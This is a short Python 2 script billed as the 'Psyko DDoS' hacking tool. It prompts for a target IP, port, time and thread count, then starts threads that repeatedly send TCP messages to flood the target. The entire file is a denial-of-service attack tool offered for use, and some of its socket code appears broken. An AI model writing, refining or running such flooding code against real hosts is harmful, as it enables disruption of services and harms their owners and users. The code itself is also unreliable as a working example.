"""
Title: Psyko DDoS
Type: Hacking Tool
Version: 1.0
Author: Brandon Hammond
Summary: Psyko DDoS is a Python DDoS
         tool that uses TCP packets
         to conduct a layer 4 DDoS
         attack on the target IP
         address at the given port.
         It uses multithreading to 
         distribute the DDoS attack
         over multiple threads, thus
         amplifying it.
"""

import os
import sys
import time
import socket
import threading

def ddosAttack(ip,port,timer):
    #DDoS attack function
    timeout=time.time()+timer
    message="Psyko DDoS TCP Flood..."
    print("DDoSing %s..." % ip)
    while time.time()<timeout:
        #Generate and send TCP packet to DDoS
        sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        sock.sendto(message,(ip,port))
    print("DDoS ended...") #Display this when DDoS has timed out
        
if __name__=="__main__":
    #Main GUI
    threads=[]
    print("=")*50
    print("Psyko DDoS")
    print("v1.0")
    print("By Brandon Hammond")
    print("=")*50
    try:
        #Get all required values
        ip=raw_input("IP: ")
        port=input("Port: ")
        timer=input("Time: ")
        threads=input("Threads: ")
    except:
        #If invalid input type is entered this executes
        print("Input error...")
    for i in range(threads):
        #Generate threads
        t=threading.Thread(target=ddosAttack,args=(ip,port,timer))
        t.start()
